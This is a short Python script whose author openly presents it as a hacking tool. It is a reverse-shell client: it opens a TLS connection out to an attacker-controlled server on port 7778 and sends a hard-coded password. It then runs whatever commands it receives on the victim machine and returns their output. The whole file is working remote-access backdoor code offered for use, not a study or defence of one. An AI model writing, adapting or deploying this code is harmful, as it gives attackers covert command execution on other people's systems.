# made by PAIN for illsec to fuck crontabs

#this project was made off the idea that the internet was made to be exploited this shows the power on person can have when he is persistent 

import socket, ssl , threading, subprocess

server_ip = "" #host to recv commands from
server_port = 7778 #port to bind to 
client_cert = "client.crt" #client ssl certifacation string
client_key = "client.key" #certifacation key givin by ssl
password = b"password" #password to connect to

def handle_commands(client_socket): #handles cmd from sever 
    while True: 
        command = client_socket.recv(1024)
        if command.strip() == b"exit":
            break

        output = run_command(command)
        client_socket.send(output)


def run_command(command): #function to run command client side
    try:
        output = subprocess.run(command.decode().strip().split(),
        capture_output=True, text=True)
        return output.stdout.encode()
    except Exception as e:
        return str(e).encode()

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket to connect to to server 
    client_socket = ssl.wrap_socket(
        client, 
        certfile=client_cert,
        keyfile=client_key,      #handles ssl auth
        ca_certs="server.crt",
        cert_reqs=ssl.CERT_REQUIRED)
    client_socket.connect((server_ip, server_port))
    client_socket.send(password)
    command_handler = threading.Thread(target=handle_commands, args=(client_socket,))
    command_handler.start()
    command_handler.join()
    command_handler.close()

if __name__ == "__main__":# runs main program 
    main()